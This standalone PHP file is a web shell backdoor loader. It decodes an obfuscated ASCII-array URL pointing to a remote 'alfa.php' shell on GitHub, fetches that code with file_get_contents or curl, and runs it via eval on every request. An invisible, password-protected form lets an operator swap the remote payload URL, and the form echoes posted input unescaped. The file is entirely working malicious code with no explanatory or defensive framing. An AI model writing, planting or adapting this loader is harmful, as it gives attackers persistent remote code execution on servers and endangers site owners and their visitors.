<?php session_start();
function NuLzGG($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
$asciiArray = [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 104, 97, 120, 111, 114, 115, 116, 97, 114, 115, 47, 97, 114, 99, 104, 105, 118, 101, 47, 109, 97, 105, 110, 47, 97, 108, 102, 97, 47, 97, 108, 102, 97, 46, 112, 104, 112];
$decodedString = '';
foreach ($asciiArray as $ascii) {
    $decodedString .= chr($ascii);
}
$url = $decodedString;
$correct_password = '$2y$10$6VDjbpAEhu.N9no7h.KtGO29fwnXMN0byteFNEs5L9sXdqNRU6gai';
if (isset($_GET['nulz_reset'])) {
    $_SESSION["nulz_url"] = "";
    echo "success";
    exit;
}
if (isset($_GET['nulz'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['password'])) {
            $provided_password = $_POST['password'];
            if (password_verify($provided_password, $correct_password)) {
                if (isset($_POST['url'])) {
                    $url = $_POST['url'];
                    $_SESSION["nulz_url"] = $url;
                    echo "updated : " . $_SESSION["nulz_url"];
                    exit;
                } else {
                    echo "Error!";
                    exit;
                }
            } else {
                echo "";
                exit;
            }
        } else {
            echo "";
            exit;
        }
    } else { ?>

        <head>
            <style>
                #password {
                    order: 2
                }

                #url {
                    order: 1
                }

                #password,
                #url {
                    display: block;
                    margin-bottom: 10px;
                    opacity: 0;
                    transition: opacity .3s
                }

                #password:hover,
                #url:hover {
                    opacity: 1
                }

                form {
                    display: flex;
                    flex-direction: column;
                    align-items: flex-end
                }
            </style>
            <script>document.addEventListener("DOMContentLoaded", function () { document.querySelector("#password").addEventListener("keydown", function (e) { "Enter" === e.key && (e.preventDefault(), document.querySelector("form").submit()) }) })</script>
        </head>

        <body>
            <form action="" method="post"><input id="password" name="password" type="password"><br><input id="url" name="url"
                    value="<?php echo isset($_POST['url']) ? $_POST['url'] : ''; ?>"><br></form>
        </body>
        <?php exit;
    }
} else {
    if (empty($_SESSION["nulz_url"])) {
        $result = @file_get_contents($url);
        if (empty($result)) {
            $result = NuLzGG($url);
        }
    } else {
        $result = @file_get_contents($_SESSION["nulz_url"]);
        if (empty($result)) {
            $result = NuLzGG($_SESSION["nulz_url"]);
        }
    }
}
if (is_string($result)) {
    eval ('?>' . $result);
} else {
    echo "Error";
} ?>
